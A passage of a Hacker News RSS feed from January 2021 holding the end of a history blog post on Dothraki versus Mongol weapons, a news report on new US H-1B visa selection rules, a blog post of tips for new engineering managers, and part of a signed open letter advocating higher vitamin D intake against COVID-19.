<p><strong>In short, while the Dothraki’s weapons are an <em>arakh</em>-sword, a whip, and a bow in that order, the Mongol’s chief weapons were his bow, followed by his backup bow, followed by his <em>other </em>backup bow, followed by his spear, and then his axe and only then followed by a sword, should he have one, which he might well not</strong>.  The reason for preferring an axe or a spear for the humble nomad should not be too surprising – iron in quantity could be hard to get on the Steppe.  Spears and axes are not only weapons, but also useful hunting and survival tools; swords are generally weapons only.  <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">Nomads generally cannot do their own metal working</a>, so swords would have to be imported.  Moreover, even in a melee, the first recourse would be to a spear, <a href="https://acoup.blog/2020/05/08/collections-the-battle-of-helms-deep-part-ii-total-warg/">whose reach on horseback was a huge advantage</a>,<strong> making a sword an expensive imported foreign luxury <em>backup</em> weapon with no additional utility</strong>.  Nevertheless, it’s clear that Steppe nomads, once successful and moving into agrarian areas, liked to acquire swords – swords are effective weapons! – but the sword was about the furthest thing from the core of Mongol culture the way the <em>arakh</em> is practically the <em>symbol</em> of Dothraki culture.</p>



<figure><img data-attachment-id="5816" data-permalink="https://acoup.blog/langshiming_mao/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg" data-orig-size="1920,1118" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="langshiming_mao" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2021/01/langshiming_mao.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Mongols#/media/File:Langshiming_mao.JPG">Via Wikipedia</a>, a relatively late Mongol soldier (c. 1755) nevertheless shows nearly the full kit, including mail body defense, a long spear for use on horseback, arrows (the bow in its bow-case would have been on the other side) and, this being the 1700s, a musket.</figcaption></figure>



<p><strong>The other issue, of course, is the <em>arakh</em> itself.</strong>  Martin describes the weapons as “long razor-sharp blades, half sword and half scythe” (<em>AGoT</em>, 85) and goes back to that scythe analogy (e.g. <em>ASoS</em>, 245).  It seems generally asserted that what Martin means by this is something close to a scimitar (I have to confess, I haven’t found anywhere that Martin says …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/">https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682359</guid>
            <pubDate>Fri, 08 Jan 2021 07:10:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US to modify H1B visa selection process – wages, skill level to get priority]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682309">thread link</a>) | @LopRabbit
<br/>
January 7, 2021 | https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt80164510read"><div data-den="denmark"><div><p>The United States on Thursday announced that it will modify the selection process for H-1B visa, giving priority to salary and skills instead of the current lottery procedures. 
</p><p>
 The final rule to be published in the federal register on January 8, officials said, is aimed to protect the economic interests of US workers and better ensure the most highly skilled foreign workers benefit from the temporary employment programme. 
</p><p>
     The H-1B visa is a non-immigrant visa that allows US companies to employ foreign workers in specialty occupations that require theoretical or technical expertise. The technology companies depend on it to hire tens of thousands of employees each year from countries like India and China. 
</p><p> Modifying the H-1B cap selection process will incentivise employers to offer higher salaries, and/or petition for higher-skilled positions, and establish a more certain path for businesses to achieve personnel needs and remain globally competitive, said </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="US-Citizenship-and-Immigration-Services" actualkeyword="US Citizenship and Immigration Services">US Citizenship and Immigration Services</keyword><p>. 
</p><p>
     The final rule will be effective 60 days after its publication in the Federal Register. The next H-1B visa filing season is slated to start on April 1. 
</p><p>
 "The H-1B temporary visa programme has been exploited and abused by employers primarily seeking to fill entry-level positions and reduce overall business costs," said </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="USCIS" actualkeyword="USCIS">USCIS</keyword><p> Deputy Director for Policy Joseph Edlow. 
</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p> "The current H-1B random selection process makes it difficult for businesses to plan their hiring, fails to leverage the programme to compete for the best and brightest international workforce, and has predominantly resulted in the annual influx of foreign labor placed in low-wage positions at the expense of US workers," he said. 
</p><p>
 This effort will only affect H-1B registrations (or petitions, if the registration process is suspended) submitted by prospective petitioners seeking to file H-1B cap-subject petitions. 
</p><p>
     It will be implemented for both the H-1B regular cap and the H-1B advanced degree exemption, but it will not change the order of selection between the two as established by the H-1B registration final rule, USCIS said. 
</p><p> The </p><keyword keytype="Company" smid="0" usetype="2" keywordseo="Department-of-Homeland-Security" keynameseo="department-of-homeland-security" actualkeyword="department of homeland security">Department of Homeland Security</keyword><p> had previously published a notice of proposed rulemaking on November 2, 2020. It carefully considered the public comments received before deciding to publish the proposed regulations as a final rule, USCIS said. 
</p><p>
     According to the final rule, a version of which was released by Department of Homeland Security, Instead, a registration system that faithfully implements the Immigration and Nationality Act (INA) while prioritising registrations based on wage level within each cap will incentivize H-1B employers to offer higher wages, or to petition for positions requiring higher skills and higher-skilled aliens that are commensurate with higher wage levels, to increase the likelihood of selection and eligibility to file an H-1B cap-subject petition. 
</p><p>
 Moreover, it will maximize H-1B cap allocations, so that they more likely will go to the best and brightest workers; and it will disincentivise abuse of the H-1B programme to fill relatively lower-paid, lower-skilled positions, which is a significant problem under the present selection system, it said. 
</p><p> "While administering a random lottery system is reasonable, it is inconsiderate of Congress's statutory purposes for the H-1B program and its administration," said the final rule. 
</p><p>
 The changes in this final rule will apply to all registrations, including those for the advanced degree exemption, submitted on or after the effective date of the final rule. 
</p><p>
     As per Congressional-mandated cap, USCIS in one year can issue a maximum of 65,000 H-1B visas. It can also issue another 20,000 H-1B visas to those foreign students who have completed higher studies from a US university in STEM subjects. 
</p><p> During the public notice period, the department said, several commenters expressed support for the rule and the need to stop visa fraud, abuse, and flooding of petitions by certain staffing or consulting companies. 
</p><p>
     One commenter said the proposed rule would disincentivize companies from abusing the H-1B programme and harming US workers. Other commenters said the proposed rule would decrease potential visa abuse by employers and make sure all workers were paid according to their skillset as employers no longer would be able to lower labor expenses by hiring foreign workers. 
</p><p>
 Another said that the proposed rule would have a positive impact on US employees and college educated US citizens who take out loans for their education by making it harder for technology companies to discriminate against US citizens; US workers are being laid off in large numbers because corporations are outsourcing for profits; and the proposed rule is necessary because Indian corporations are acquiring US jobs, it said. 
</p>
<p><strong>SEE ALSO: <a href="https://www.businessinsider.in/stock-market/news/tcs-ongc-tata-power-punjab-national-bank-nhpc-and-other-top-stocks-to-watch/articleshow/80164057.cms">TCS’ market share, ONGC’s borrowing, Tata Power gets new territories⁠— these and other top stocks to watch</a></strong>
<a href="https://www.businessinsider.in/tech/news/whatsapp-is-forcing-users-to-share-personal-data-with-facebook-and-elon-musk-is-urging-people-to-switch-to-signal-a-smaller-encrypted-messaging-app/articleshow/80156317.cms">WhatsApp is forcing users to share personal data with Facebook, and Elon Musk is urging people to switch to Signal, a smaller encrypted messaging app</a>
<br>
</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/international/news/us-to-modify-h1b-visa-selection-process-wages-skill-level-to-get-priority-over-lottery-system/articleshow/80164510.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682309</guid>
            <pubDate>Fri, 08 Jan 2021 07:02:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for a New Engineering Manager]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25681979">thread link</a>) | @alexhunterlang
<br/>
January 7, 2021 | https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/ | <a href="https://web.archive.org/web/*/https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Welcome to the new world of engineering management! You’ve entered a brave new world that will be significantly different than your life as an individual contributor. Here are some tips I’ve learned over time.</p>



<p>You have one goal: <strong>maximize your team’s productive work</strong>.</p>



<p>That’s it. Do that and you will succeed. Do anything else and you fail. Life is simple.</p>



<p>Let’s break that down into a few key ideas.</p>



<h2>Maximize Your Team Member’s Potential</h2>



<p>First, let’s assess the type of engineers you may have on your team.</p>



<ul><li><strong>Solid</strong> = Can solve well defined problems.</li><li><strong>Bad</strong> = Can’t solve well defined problems.</li><li><strong>Junior</strong> = Bad engineers but have the excuse of being very early in their career or being put into a new situation.</li><li><strong>Leaders</strong> = Can determine the problems that need to be solved and help others get the necessary work done.</li></ul>



<p>How should you manage the different types of engineers?</p>



<p><strong>Engineering Leaders</strong>. If you are a new manager, you are likely the only Leader in your team. If you are lucky enough to have team members that are Leaders, your life will be easy. Just keep giving them tough problems and stay out of their way.</p>



<p><strong>Solid Engineers</strong>. These engineers will hopefully make up most of your team. They can tackle well defined problems, so to maximize their current utility, work on giving them the minimum definition they need and then get out of their way. To maximize their long term success, you want to try and turn Solid Engineers into Leaders. One way to do this is to keep giving them tougher problems with less definition and let them grow into Leaders.</p>



<p><strong>Bad Engineers. </strong>Hopefully you don’t inherit any Bad Engineers. If you do, you need to quickly assess whether it is worth the management effort to get them to Solid Engineers, or get them off your team (either by firing or a transfer to another team).</p>



<p><strong>Junior Engineers. </strong>As a new manager, you are likely to have several Junior Engineers. I’ve found that everyone is happiest if both the Junior Engineer and yourself acknowledge that Junior Engineers do not produce useful work today. Instead, both the Junior Engineer and yourself should focus your efforts on turning them into a Solid Engineer as soon as possible. As a manager, you can accelerate their growth by (1) giving them training tasks, i.e. tasks that may not be the most relevant to your team’s productivity today, but help them grow as an individual and (2) giving them extra 1 on 1 attention. While this extra effort will consume significant time now, you can have a Solid Engineer within a few months. Plus, this extra effort is nothing compared to the effort you would later need to spend to move someone from a Bad Engineer to Solid Engineer.</p>



<h2>Maximize Your Team Output</h2>



<p>Now that we have covered the basics of maximizing individual team member’s performance, let’s move on to some tips for maximizing your whole team’s output.</p>



<h3>Your Output</h3>



<p>First, you need to plan that your personal coding output will basically be zero. You may occasionally do some coding, but you need to remember that you are judged on your team’s output now, not just your own. So any coding project you do needs to be weighed against the opportunity cost of you spending that same amount of time improving your team members. I’ve found that this likely means you will only end up coding (1) early prototypes, (2) refactorings, or (3) nice to have projects. Instead, you need to switch to thinking about your team’s output.</p>



<h3>Meetings</h3>



<p>As a new manager, your life can easily be consumed by meetings. You will now be in charge of 1:1s and team meetings, and also get invited to lots of cross team meetings. My biggest regret as an early manager is saying yes to every meeting. I personally am fine with delegating work, but my weakness was that I still wanted to know everything that was going on. Before you know it, you will spend all day running from meeting to meeting. This is bad for three reasons: (1) you don’t have time to think, (2) you can’t adapt to emergencies and (3) your team members will become too shy to schedule 1:1s with you since they assume you are doing something important.&nbsp;&nbsp;</p>



<p>So fight the good fight and minimize the number of meetings. I advocate the following meeting philosophy:</p>



<ul><li>All meetings should have a predefined agenda, even 1:1s.</li><li>Have the minimum number of people in the meeting (ie prefer 1:1s or small groups)</li><li>Minimize the number of meetings that are just status updates. Most of these can likely be replaced by email, Slack, or a document.</li><li>Group meetings into blocks. I’ve had success with the following type of meeting schedule:<ul><li>Monday AM: Sprint starts / big team meetings.</li><li>Monday PM: 1:1s.</li><li>Tuesday: No recurring meetings.</li><li>Wednesday: Cross team meetings.</li><li>Thursday: No recurring meetings.</li><li>Friday AM: Sprint check ins / sprint end meetings.</li><li>Friday PM: 1:1s.</li></ul></li></ul>



<h3>Documents</h3>



<p>A well written document is one of your two new best friends. The power of a well written document is that it (1) forces you to clarify your thoughts, (2) provides a clear documentation trail and (3) prevents you from repeating yourself. There is nothing worse than having a meeting with a lot of people that leads to some very important decisions, but then no one can seem to remember what those decisions are. Write, write, and write some more.&nbsp;</p>



<h2>Do Productive Work</h2>



<p>At this point your team should be doing lots of work. But how do you guarantee that this work is productive? Let me introduce you to your second new best friend: <a href="https://www.whatmatters.com/get-started/">Objectives and Key Results</a>.&nbsp;</p>



<p>The main principles of OKRs are:</p>



<ul><li>Objectives should be clearly defined aspirational goals</li><li>Key results are specific quantitative measures</li><li>Each objective should be supported by 3-5 key results</li><li>Ideally key results can be measured on a 0-100% scale</li><li>To make key results push the boundaries of your team, it is recommended that<ul><li>A key result is considered achieved if &gt;=70% is achieved</li><li>Key results are not tied to pay</li></ul></li></ul>



<p>Many companies use a mix of yearly and quarterly OKRs. I personally find the quarter OKRs most useful as a management tool. The yearly OKRs are more useful for upper management to set clear company wide goals, but I’ve found that setting yearly team goals are not very useful unless they directly tie into a company OKR. Instead, I would focus on writing solid quarterly team OKRs.</p>



<p>For OKRs to truly work, you need to get buy in from the whole team. In order to get buy in, you should:</p>



<ol><li>Do the necessary prep work to deeply understand the company priorities and OKRs.</li><li>Involve your team members in developing the team OKRs.</li><li>Set up a central dashboard to track your progress on OKRs.</li><li>Make that dashboard a central part of your meetings. Kick off team meetings by looking at the dashboard and calling out progress.</li><li>Have a retrospective at the end of the recording period to understand why your team succeeded or failed to achieve OKRs.</li><li>Rinse and repeat. Your first several quarters of OKRs likely won’t go well. But please don’t give up until you have tried for at least 4 quarters in a row.</li></ol>



<h2>Final Thoughts</h2>



<p>Good luck, hope these tips help!</p>
			
			
						</div></div>]]>
            </description>
            <link>https://n2infinityandbeyond.com/2021/01/07/tips-for-a-new-engineering-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25681979</guid>
            <pubDate>Fri, 08 Jan 2021 06:02:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over 100 Scientists and Doctors Call for Increased Vitamin D to Combat Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 110 (<a href="https://news.ycombinator.com/item?id=25680282">thread link</a>) | @kpfleger
<br/>
January 7, 2021 | https://vitamindforall.org/letter.html | <a href="https://web.archive.org/web/*/https://vitamindforall.org/letter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>#VitaminDforAll </span><span>(for questions or fact checking assistance, contact press@vitaminDforAll.org)</span></p><p id="h.mjz6soj7f435"><span>Over 100 </span><span>Scientists, Doctors, &amp; Leading Authorities</span><span>&nbsp;Call For </span><span>Increased</span><span>&nbsp;Vitamin D Use To Combat COVID-19</span></p><p><span>[Residents of the USA: Text “VitaminDforAll” to 50409 to send this to your state’s governor.]</span></p><p><span>Research shows low vitamin D levels almost certainly promote COVID-19 infections, hospitalizations, and deaths. Given its safety, </span><span>w</span><span>e call for immediate widespread increased vitamin D intakes</span><span>.</span></p><p><span>Vitamin D modulates thousands of genes and many aspects of immune function, both innate and adaptive. The scientific evidence</span><span>1</span><span>&nbsp;shows that:</span></p><p><span>Vitamin D is well known to be essential, but most people do not get enough. Two common definitions of inadequacy are deficiency &lt; 20ng/ml (50nmol/L), the target of most governmental organizations, and insufficiency &lt; 30ng/ml (75nmol/L), the target of several medical societies &amp; experts.</span><span>2</span><span>&nbsp;Too many people have levels below these targets. </span><span>Rates of vitamin D deficiency &lt;20ng/ml exceed 33% of the population in most of the world, and most estimates of insufficiency &lt;30ng/ml are well over 50% (but much higher in many countries).</span><span>3</span><span>&nbsp;Rates are even higher in winter, and several groups have notably worse deficiency: the overweight, those with dark skin (especially far from the equator), and care home residents. These same groups face increased COVID-19 risk.</span></p><p><span>It has been shown that 3875 IU (97mcg) daily is required for 97.5% of people to reach 20ng/ml, and 6200 IU (155mcg) for 30ng/ml,</span><span>4</span><span>&nbsp;intakes far above all national guidelines. Unfortunately, the report that set the US RDA included an admitted statistical error in which required intake was calculated to be ~10x too low.</span><span>4</span><span>&nbsp;Numerous calls in the academic literature to raise official recommended intakes had not yet resulted in increases by the time SARS-CoV-2 arrived. Now, many papers indicate that vitamin D affects COVID-19 more strongly than most other health conditions, with increased risk at levels &lt; 30ng/ml (75nmol/L) and severely greater risk &lt; 20ng/ml (50nmol/L).</span><span>1</span></p><p><span>Evidence to date </span><span>suggests </span><span>the possibility that the COVID-19 pandemic sustains itself in large part &nbsp;through infection of those with low vitamin D, and that deaths are concentrated largely in those with deficiency. The mere possibility that this is so should compel urgent gathering of more vitamin D data. </span><span>Even without more data</span><span>, </span><span>the </span><span>preponderance </span><span>of evidence indicates that </span><span>increased vitamin D would help reduce infections, hospitalizations, ICU admissions, &amp; deaths</span><span>.</span></p><p><span>Decades of safety data show that vitamin D has very low risk: </span><span>Toxicity would be extremely rare with the recommendations here. The risk of insufficient levels far outweighs any risk from levels that seem to provide most of the protection against COVID-19, and this is notably different from drugs. Vitamin D is much safer than steroids, such as dexamethasone, the most widely accepted treatment to have also demonstrated a large COVID-19 benefit. Vitamin D’s safety is more like that of face masks. </span><span>There is no need to wait for further clinical trials to increase use of something so safe, </span><span>especially when remedying high rates of deficiency/insufficiency should already be a priority</span><span>.</span></p><p><span>Therefore, we call on all governments, doctors, and healthcare workers worldwide to immediately recommend and implement efforts appropriate to their adult populations to increase vitamin D, at least until the end of the pandemic. Specifically to:</span></p><p><span>Many factors are known to predispose individuals to higher risk from exposure to SARS-CoV-2, such as age, being male, comorbidities, etc., but </span><span>inadequate</span><span>&nbsp;v</span><span>itamin D is by far the most easily and quickly </span><span>modifiable</span><span>&nbsp;risk factor with abundant evidence to support a large effect</span><span>. Vitamin D is inexpensive and has negligible risk compared to the considerable risk of COVID-19.</span></p><p><span>5</span><span>&nbsp;The following include 4000 IU within their tolerable intakes in official guidelines: NAM (US, Canada), SACN (UK), EFSA (Europe), Endocrine Society (international), Nordic countries, The Netherlands, Australia &amp; New Zealand, UAE, and the American Geriatrics Soc. (USA, elderly). No major agency specifies a lower tolerable intake limit. The US NAM said 4000 IU “is likely to pose no risk of adverse health effects to almost all individuals.” See also [</span><span><a href="https://pubmed.ncbi.nlm.nih.gov/32180081/">Giustina et al ‘20</a></span><span>].</span></p><p><span>The signatories below endorse this letter. Affiliations do not imply endorsement of the letter by the institutions themselves.</span></p><p><span>This letter takes no position on other public health measures besides vitamin D. Personal views of individual signatories on any other matter do not represent the group as a whole.</span></p><p><span>All signatories declare no conflicts of interest except as noted.</span></p><p><span>To emphasize: </span><span>The organizing signatories have no conflicts of interest in this area (financial or otherwise)</span><span>, nor have they done research in this area prior to 2020.</span></p><div><tbody><tr><td colspan="1" rowspan="1"><p><span>Signatories (185)</span></p></td><td colspan="1" rowspan="1"><p><span>recom- mended intake</span></p></td><td colspan="1" rowspan="1"><p><span>personal daily intake</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Karl Pfleger</span><span>, PhD AI &amp; Computer Science, Stanford. Former Google Data Scientist. Biotechnology Investor, AgingBiotech.info, San Francisco, CA, USA. (organizing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>7000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Gareth Davies</span><span>, PhD Medical Physics, Imperial College, London, UK. Codex World’s Top 50 Innovator 2019. Independent Researcher. Lead author of “</span><span><a href="https://www.medrxiv.org/content/10.1101/2020.05.01.20087965v3">Evidence Supports a Causal Role for Vitamin D Status in COVID-19 Outcomes</a></span><span>.” (organizing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>10,000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Bruce W Hollis</span><span>, PhD. Professor of Pediatrics, Medical University of South Carolina, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Barbara J Boucher</span><span>, MD, FRCP (London). </span><span>Honorary Professor (Medicine), Blizard Institute, Bart's &amp; The London School of Medicine and Dentistry, Queen Mary University of London, UK. </span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Ashley Grossman</span><span>, MD FRCP FMedSci. Emeritus Professor of Endocrinology, University of Oxford, UK. Professor of Neuroendocrinology, Barts and the London School of Medicine. 2020 Endocrine Society Laureate Award.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2200 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Gerry Schwalfenberg</span><span>, MD, CCFP, FCFP. Assistant Clinical Professor in Family Medicine, University of Alberta, Canada.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Giovanna Muscogiuri</span><span>, MD PhD. Associate Editor, European Journal of Clinical Nutrition. </span><span>Department of Clinical Medicine and Surgery, Section of Endocrinology, University "Federico II" of Naples, Naples, Italy.</span><span>.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>1000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Michael F. Holick</span><span>, PhD MD. Professor Medicine, Physiology and Biophysics and Molecular Medicine, Director Vitamin D, Skin and Bone Research Laboratory, Boston University Medical Center, USA. (6000 IU) </span><span>Disclosure: Consultant Biogena and speaker's Bureau Abbott Inc.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. John Umhau</span><span>, MD, MPH. CDR, USPHS (ret). </span><span>President, Academy of Medicine of Washington, DC, USA. Ex-NIH: c</span><span>o-author of the first peer-reviewed report linking vitamin D deficiency with acute respiratory infection.</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. </span><span>Pawel</span><span>&nbsp;</span><span>Pludowski</span><span>, MD, dr hab. Associate Professor, Biochemistry, Radioimmunology and Experimental Medicine, Children’s Memorial Health Institute, Warsaw, Poland. Chair, European Vitamin D Association (EVIDAS) [non-profit].</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Cedric F. Garland</span><span>, DrPH. Professor Emeritus, Department of Family Medicine and Public Health, University of California, San Diego, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Jose M. Benlloch</span><span>, Professor, Director of the Institute for Instrumentation on Molecular Imaging, CSIC-UPV, Valencia, Spain.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>3000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Samantha Kimball</span><span>, PhD, MLT. Professor, St. Mary's University, Calgary, Alberta, Canada. Research Director, GrassrootsHealth Nutrient Research Institute [non-profit].</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. William B. Grant</span><span>, PhD Physics, U. of California, Berkeley. Director at Sunlight, Nutrition, and Health Research Center [non-profit], San Francisco, CA, USA. </span><span>Disclosure: Receives funding from Bio-Tech Pharmacal, Inc.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5300 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Carol L. Wagner,</span><span>&nbsp;MD. Professor, Medical University of South Carolina, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Paul Marik</span><span>, MD, FCCP, FCCM. </span><span>Chief of Pulmonary and Critical Care Medicine and Professor of Medicine</span><span>, Eastern Virginia Medical School, Norfolk, VA, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Morry Silberstein</span><span>, MD. Associate Professor, Curtin University, Australia.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Vatsal Thakkar</span><span>, MD. Founder, Reimbursify, NY, USA. &nbsp;Former faculty, NYU and Vanderbilt. &nbsp;Op-Ed writer on Vitamin D and COVID-19.</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>10,000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Peter H Cobbold</span><span>, PhD. Emeritus Professor, Cell Biology, University of Liverpool, UK.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Afrozul Haq</span><span>, PhD. Professor Dept of Food Technology, Jamia Hamdard University, New Delhi, India.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Barry H. Thompson</span><span>, MD, FAAP, FACMG. Clinical Associate Professor (Pediatrics), Uniformed Services University of the Health Sciences, Bethesda, MD, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Reinhold Vieth</span><span>, PhD, FCACB. Professor, Departments of Nutritional Sciences and Laboratory Medicine &amp; Pathobiology, University of Toronto, Canada. Director (retired), Bone and Mineral Group Laboratory, Mt Sinai Hospital. </span><span>Disclosure: </span><span>Receives patent royalties from Ddrops (an infant vitamin D supplement).</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Linda Benskin</span><span>, PhD, RN, SRN(Ghana), CWCN, CWS, DAPWCA. Independent Researcher for Tropical Developing Countries and Ferris Mfg. Corp, Texas, USA. </span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Jim O’Neill</span><span>, CEO, SENS Research Foundation. Former principal associate deputy secretary of Health and Human Services, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Eric Feigl-Ding</span><span>, PhD. Epidemiologist &amp; Health Economist. Senior Fellow, Federation of American Scientists. USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Rt Hon David Davis MP</span><span>, Member of Parliament (Conservative Party). BSc, Joint Hons Molecular Science / Computer Science, Warwick University, UK.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Rupa Huq MP,</span><span>&nbsp;Member of Parliament (Labour Party). PhD, Cultural Studies, University of East London, UK.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" 